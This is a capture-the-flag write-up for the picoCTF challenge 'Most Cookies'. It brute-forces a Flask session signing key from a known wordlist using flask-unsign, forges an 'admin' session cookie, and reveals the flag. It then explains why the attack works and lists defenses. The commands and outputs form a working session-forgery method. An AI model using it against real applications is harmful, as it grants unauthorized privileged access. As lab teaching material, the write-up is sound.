# Most Cookies

## Challenge
Alright, enough of using my own encryption. Flask session cookies should be plenty secure! 
- server.py 
- http://mercury.picoctf.net:65344/
- Given 2 links
    - First to download the `server.py` file.
    - Second to a web interface that asks for a cookie name.
- Submitting a valid name among a predefined list causes a redirect, and your session state is updated.
- Our goal is to get the flag by forging a session cookie that makes `very_auth = "admin"`.

## Solve
**Flag:** `picoCTF{pwn_4ll_th3_cook1E5_25bdb6f6}`
### Thought Process.
- Since the challenge has something to do with cookies, we check them first.
- We have a cookie named `session` and a **JWT** token with the value `eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.aOp8Nw.XWntfJ8NyW-mI-DIfVX76RVRjMM`
- Upon decoding the above token, we get:
    ```json
    {
      "very_auth": "blank"
    }
    ```
- Upon entering the value `snickerdoodle` as the placeholder suggests we get yet another token: `eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.aOs_sQ.nPQ856U9hQfpgDjO48D52VXyp0o`.
- This decodes to:
    ```json
      {
          "very_auth": "snickerdoodle"
      }   
    ```
- From the python file provided we get to know the following things:
    - We are provided with a list of available cookies:
        ```python
        cookie_names = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"]
        ```
    - A random cookie name is selected as a secret key.
        ```python
        app.secret_key = random.choice(cookie_names)
        ```
    - From the following code we know that:
        ```python
            if session.get("very_auth"):
                check = session["very_auth"]
                if check == "admin":
                    resp = make_response(render_template("flag.html", value=flag_value, title=title))
                    return resp
        ```
        - We must get the correct cookie first.
        - Set the `very_auth` value of that cookie's JWT token to `admin` to trick the website into giving us the flag.

### Execution
- Tools used:
    - `flask-unsign`
- Create a wordlist of the cookies and store it in a `cookies.txt` file to pass it to the above command.
- The following command attempts to brute-force the Flask session signing key of the given web server using the wordlist `cookies.txt`:
    ```
    flask-unsign -u --server "http://mercury.picoctf.net:65344/" --wordlist ~/Downloads/cookies.txt
    [*] Server returned HTTP 302 (FOUND)
    [+] Successfully obtained session cookie: eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.aOtOkQ.P3mOhsOmRXnJuULlFbNwhhe91A8
    [*] Session decodes to: {'very_auth': 'blank'}
    [*] Starting brute-forcer with 8 threads..
    [+] Found secret key after 28 attemptscadamia
    'fortune'
   ```
- The secret cookie is `fortune`.
- We now sign this cookie to give us the admin privileges:
    ```
    flask-unsign -s --cookie "{'very_auth': 'admin'}" --secret fortune                        
    eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.aOtOrg.z2Y3YlLR7YivNuuCEDu2z9UTOdg
    ```
- Edit the session cookie JWT on the website with this new obtained JWT token and refresh the page.

### New Learnings
**Cookies** are tiny jars the browser carries for a site: they can hold session data and a signature that says “this came from the server.”

**In this challenge — how an attacker abuses them**
- **Capture** the `session` cookie (browser devtools or a proxy).  
- **Brute‑force** the signing key from the small, known list in the source.  
- **Re‑sign** a crafted session payload, e.g. `{"very_auth":"admin"}`, using the discovered key.  
- **Inject** the forged cookie into the browser or an HTTP request and access the admin/flag page.

**Why it works**
- Flask session cookies are *signed* (integrity), not encrypted (confidentiality).  
- If the signing key is guessable or from a tiny public set, signatures can be forged.

**Defenses**
- Use long, random, private `secret_key`.  
- Store sensitive session state server‑side (avoid client‑stored privileges).  
- Rotate keys and avoid exposing secret lists in source.

### Resources
- [picoGym (picoCTF) Exercise: Most Cookies](https://www.youtube.com/watch?v=YBrhvnEEp24)
